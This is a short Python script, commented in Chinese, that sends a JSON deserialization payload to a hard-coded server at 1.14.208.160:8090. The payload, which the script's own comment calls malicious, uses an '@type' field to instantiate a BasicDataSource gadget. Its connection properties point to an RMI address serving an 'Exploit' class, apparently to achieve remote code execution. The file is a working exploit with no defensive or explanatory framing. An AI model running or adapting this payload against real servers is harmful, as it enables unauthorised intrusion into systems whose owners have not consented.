import requests
import json

# 目标服务器的URL
url = "http://1.14.208.160:8090"

# 构造符合格式的恶意 JSON 数据
malicious_json = {
    "b": {
        "@type": "org.apache.commons.dbcp2.BasicDataSource",
        "driverClassName": "org.postgresql.Driver",
        "url": "jdbc:postgresql://192.168.1.12:5432/test",
        "username": "test",
        "password": "test",
        "connectionProperties": "rmi://192.168.1.12:1099/Exploit"
    },
    "age": 25,
    "name": "Bob"
}

# 打印将要发送的JSON数据
print("Sending JSON data:")
print(json.dumps(malicious_json, indent=4))

# 发送 POST 请求
headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, json=malicious_json, headers=headers)

# 打印响应
print(f"Response status code: {response.status_code}")
print(f"Response content: {response.content.decode()}")
